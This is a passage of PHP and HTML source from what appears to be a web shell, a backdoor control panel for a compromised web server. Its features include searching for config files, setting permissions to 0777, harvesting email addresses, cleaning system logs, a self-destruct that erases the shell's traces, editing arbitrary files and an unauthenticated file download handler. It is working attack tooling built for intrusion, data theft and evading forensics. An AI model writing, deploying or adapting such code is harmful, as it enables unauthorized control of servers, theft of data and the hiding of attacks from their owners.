                        <h4>File Search</h4>
                        <form method="POST">
                            <input type="hidden" name="file_search" value="1">
                            <input type="text" name="search_dir" placeholder="Directory" value="<?= htmlspecialchars($path) ?>">
                            <input type="text" name="search_pattern" placeholder="Search pattern" value="config">
                            <button type="submit" class="btn">Search Files</button>
                        </form>
                        <?php if (isset($_SESSION['search_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['search_results']) ?>
                        </div>
                        <?php unset($_SESSION['search_results']); endif; ?>
                    </div>

                    <!-- Permission Fixer -->
                    <div class="feature-card">
                        <h4>Permission Fixer</h4>
                        <form method="POST">
                            <input type="hidden" name="fix_permissions" value="1">
                            <input type="text" name="fix_dir" placeholder="Directory" value="<?= htmlspecialchars($path) ?>">
                            <input type="text" name="fix_mode" placeholder="Mode (0777)" value="0777">
                            <button type="submit" class="btn">Fix Permissions</button>
                        </form>
                        <?php if (isset($_SESSION['fix_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['fix_results']) ?>
                        </div>
                        <?php unset($_SESSION['fix_results']); endif; ?>
                    </div>

                    <!-- Email Harvester -->
                    <div class="feature-card">
                        <h4>Email Harvester</h4>
                        <form method="POST">
                            <input type="hidden" name="harvest_emails" value="1">
                            <input type="text" name="harvest_dir" placeholder="Directory" value="<?= htmlspecialchars($path) ?>">
                            <button type="submit" class="btn">Harvest Emails</button>
                        </form>
                        <?php if (isset($_SESSION['email_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['email_results']) ?>
                        </div>
                        <?php unset($_SESSION['email_results']); endif; ?>
                    </div>

                    <!-- Miner Check -->
                    <div class="feature-card">
                        <h4>Miner Check</h4>
                        <form method="POST">
                            <input type="hidden" name="miner_check" value="1">
                            <input type="text" name="check_dir" placeholder="Directory" value="<?= htmlspecialchars($path) ?>">
                            <button type="submit" class="btn">Check for Miners</button>
                        </form>
                        <?php if (isset($_SESSION['miner_results'])): ?>
                        <div class="terminal" style="height: 300px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['miner_results']) ?>
                        </div>
                        <?php unset($_SESSION['miner_results']); endif; ?>
                    </div>

                    <!-- Log Cleaner -->
                    <div class="feature-card">
                        <h4>Log Cleaner</h4>
                        <form method="POST">
                            <input type="hidden" name="clean_logs" value="1">
                            <button type="submit" class="btn btn-danger">Clean System Logs</button>
                        </form>
                        <?php if (isset($_SESSION['clean_results'])): ?>
                        <div class="terminal" style="height: 200px; margin-top: 10px;">
                            <?= implode("\n", $_SESSION['clean_results']) ?>
                        </div>
                        <?php unset($_SESSION['clean_results']); endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <!-- Self Destruct -->
        <div id="destruct" class="tab-content">
            <div class="panel">
                <h3> SELF DESTRUCT SYSTEM</h3>
                <div class="warning" style="color: var(--yellow); margin-bottom: 20px;">
                     This will permanently delete the shell file and all traces. Operation cannot be undone!
                </div>
                
                <form method="POST" onsubmit="return confirm('ARE YOU SURE? This will DELETE the shell permanently!');">
                    <input type="hidden" name="self_destruct" value="1">
                    <button type="submit" class="btn btn-danger" style="padding: 15px; font-size: 18px;">
                         ACTIVATE SELF DESTRUCT
                    </button>
                </form>

                <div style="margin-top: 20px; color: #aaa;">
                    <h4>Destruct Sequence:</h4>
                    <ol>
                        <li>Overwrite shell file with random data</li>
                        <li>Permanently delete the file</li>
                        <li>Clear session data</li>
                        <li>Terminate all operations</li>
                    </ol>
                </div>
            </div>
        </div>

        
        <?php if (isset($_GET['edit'])): 
            $file = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
            if (is_file($file)):
                if (isset($_SESSION['save_result'])) {
                    echo '<div class="success">' . $_SESSION['save_result'] . '</div>';
                    unset($_SESSION['save_result']);
                }
                $content = htmlspecialchars(file_get_contents($file));
        ?>
        <div class="panel">
            <h3>Editing: <?= htmlspecialchars($_GET['edit']) ?></h3>
            <form method="POST">
                <textarea name="content" rows="20" style="width:100%;font-family:monospace;"><?= $content ?></textarea>
                <button type="submit" name="savefile" class="btn btn-success">Save</button>
                <a href="?path=<?= urlencode($path) ?>" class="btn">Cancel</a>
            </form>
        </div>
        <?php endif; endif; ?>
    </div>

    <script>
        
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                tab.classList.add('active');
                document.getElementById(tab.dataset.tab).classList.add('active');
            });
        });

        function setCommand(cmd) {
            document.querySelector('input[name="cmd"]').value = cmd;
            document.querySelector('[data-tab="terminal"]').click();
        }

        function goToPath() {
            window.location.href = '?path=' + encodeURIComponent(document.getElementById('pathInput').value);
        }

        function createFile() {
            const name = prompt('File name:');
            if (name) window.location.href = '?path=<?= urlencode($path) ?>&createfile=' + encodeURIComponent(name);
        }

        function createFolder() {
            const name = prompt('Folder name:');
            if (name) window.location.href = '?path=<?= urlencode($path) ?>&createfolder=' + encodeURIComponent(name);
        }

        function showUpload() {
            document.getElementById('uploadForm').style.display = 'block';
        }

        function deleteAll() {
            if (confirm('Delete ALL files in this directory?')) {
                window.location.href = '?path=<?= urlencode($path) ?>&delete_all=1';
            }
        }

        
        document.querySelectorAll('.terminal').forEach(term => {
            term.scrollTop = term.scrollHeight;
        });
    </script>
</body>
</html>

<?php

function formatSize($bytes) {
    $units = ['B','KB','MB','GB'];
    for ($i = 0; $bytes > 1024; $i++) $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}


if (isset($_GET['download'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}
?>